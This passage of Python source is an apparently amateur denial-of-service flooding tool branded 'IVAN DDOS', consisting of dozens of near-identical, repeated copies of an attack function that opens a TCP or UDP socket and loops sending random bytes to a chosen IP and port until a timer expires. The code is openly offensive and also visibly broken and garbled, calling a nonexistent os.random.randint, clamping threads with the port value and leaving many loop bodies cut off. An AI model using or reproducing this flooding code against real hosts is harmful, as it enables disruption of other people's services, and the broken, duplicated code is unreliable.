        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
